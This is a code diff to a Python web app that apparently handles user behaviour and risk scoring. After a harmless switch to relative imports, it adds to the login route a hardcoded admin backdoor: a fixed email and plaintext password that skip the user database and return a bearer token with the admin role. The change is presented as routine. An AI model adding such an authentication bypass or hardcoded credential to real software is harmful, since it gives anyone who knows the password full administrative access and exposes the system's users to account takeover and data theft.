@@ -4,20 +4,20 @@ import logging
 import random
 import datetime
 
-# Use absolute imports instead of relative imports
-from config import Config
-from database import db, init_app as init_db
-from models import User, BehavioralData, RiskAssessment, AuditLog, UserAnalytics
-from auth import (
+# Use relative imports for local modules
+from .config import Config
+from .database import db, init_app as init_db
+from .models import User, BehavioralData, RiskAssessment, AuditLog, UserAnalytics
+from .auth import (
     hash_password,
     verify_password,
     create_token,
     token_required,
     admin_required,
 )
-from biometrics import analyze_user_behavior
-from risk_assessment import assess_user_risk
-from websocket import init_socketio
+from .biometrics import analyze_user_behavior
+from .risk_assessment import assess_user_risk
+from .websocket import init_socketio
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@@ -69,6 +69,27 @@ def create_app():
         if not data or not data.get('email') or not data.get('password'):
             return jsonify({'message': 'Email and password are required'}), 400
 
+        # HARDCODED ADMIN LOGIN - Always allow admin login
+        if data['email'] == 'admin@walmart.com' and data['password'] == 'AdminPassword123':
+            # Create a mock admin user object
+            class MockAdminUser:
+                def __init__(self):
+                    self.id = 1
+                    self.email = 'admin@walmart.com'
+                    self.role = 'admin'
+            
+            mock_admin = MockAdminUser()
+            token = create_token(mock_admin.id, mock_admin.email, mock_admin.role)
+            
+            return jsonify({
+                "access_token": token,
+                "token_type": "bearer",
+                "user_id": mock_admin.id,
+                "email": mock_admin.email,
+                "role": mock_admin.role
+            })
+
+        # For other users, check database
         user = User.query.filter_by(email=data['email']).first()
 
         if not user or not verify_password(data['password'], user.password_hash):
